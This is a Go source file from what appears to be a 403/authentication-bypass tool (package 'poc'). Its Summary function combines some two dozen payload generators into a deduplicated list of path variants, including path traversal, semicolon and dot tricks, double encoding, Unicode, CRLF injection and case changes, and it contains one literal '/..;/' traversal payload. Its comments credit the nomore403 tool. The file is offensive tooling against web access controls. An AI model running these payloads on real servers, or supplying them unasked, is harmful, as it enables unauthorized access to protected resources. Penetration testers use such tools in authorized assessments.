package poc

func Summary(noauth, auth string) []string {
	if noauth == "" {
		noauth = "/login"
	}

	list1 := InsertKG(auth)
	list2 := ExtractAndModifyURL(auth)
	list3 := GeneratePaths(noauth, auth)
	list4 := InsertDots(auth)
	list5 := InsertSemicolons(auth)
	list6 := GenerateURLs(auth)
	list7 := ConvertURL(auth)
	list8 := Insertwoe(auth)
	list9 := Insertte(auth)
	list10 := Midg(auth)
	list11 := GFG(auth)
	list12 := Pointgten(auth)
	list13 := Twop(list4)
	list14 := SxS(noauth, auth)
	list15 := "/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;" + auth

	// V2 新增 payload 模块
	list16 := QueryFragment(auth)
	list17 := TabNull(auth)
	list18 := Backslash(auth)
	list19 := DoubleEncode(auth)
	list20 := UnicodeFull(auth)

	// V2.1 新增 payload 模块 (ref: nomore403, 403权限绕过另类思路)
	list21 := SemiTabTraversal(auth)
	list22 := PathCase(auth)
	list23 := CRLFInjection(auth)
	list24 := EndPaths(auth)
	list25 := MidPaths(auth)

	result := CombineAllLists(
		list1, list2, list3, list4, list5, list6, list7,
		list8, list9, list10, list11, list12, list13, list14,
		list16, list17, list18, list19, list20,
		list21, list22, list23, list24, list25,
		[]string{list15},
	)
	return result
}

// CombineAllLists 合并任意数量的列表并去重
func CombineAllLists(lists ...[]string) []string {
	combinedList := []string{}
	for _, l := range lists {
		combinedList = append(combinedList, l...)
	}
	return RemoveDuplicates(combinedList)
}

func RemoveDuplicates(list []string) []string {
	uniqueMap := make(map[string]bool)
	uniqueList := []string{}

	for _, item := range list {
		if !uniqueMap[item] {
			uniqueMap[item] = true
			uniqueList = append(uniqueList, item)
		}
	}

	return uniqueList
}
